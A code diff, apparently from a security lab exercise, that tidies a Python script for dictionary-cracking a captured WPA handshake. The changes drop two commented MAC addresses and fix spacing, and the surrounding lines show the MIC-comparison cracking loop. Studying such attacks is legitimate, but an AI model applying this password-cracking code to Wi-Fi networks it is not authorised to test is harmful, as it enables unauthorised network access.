@@ -32,8 +32,8 @@ wpa = rdpcap("wpa_handshake.cap")
 dictionary = "dict.txt"
 A = "Pairwise key expansion"
 ssid = wpa[0].info.decode('utf-8')
-APmac = a2b_hex(wpa[0].addr2.replace(':', ''))  # cebcc8fdcab7
-Clientmac = a2b_hex(wpa[1].addr1.replace(':', ''))  # 0013efd015bd
+APmac = a2b_hex(wpa[0].addr2.replace(':', ''))
+Clientmac = a2b_hex(wpa[1].addr1.replace(':', ''))
 
 ANonce = wpa[5].original[67:99]
 SNonce = wpa[6].original[65:97]
@@ -70,7 +70,7 @@ with open(dictionary, "r") as passphrases:
 
         # calculate MIC over EAPOL payload (Michael)- The ptk is, in fact, KCK|KEK|TK|MICK (support for SHA1 and MD5)
         mic = hmac.new(ptk[0:16], data, hashlib.sha1 if mic_type == 2 else hashlib.md5)
-        index+=1
+        index += 1
         if mic.digest()[:-4] != mic_to_test:
             continue
         print("Passphrase found : \"{}\". {} attempts".format(passphrase, index))
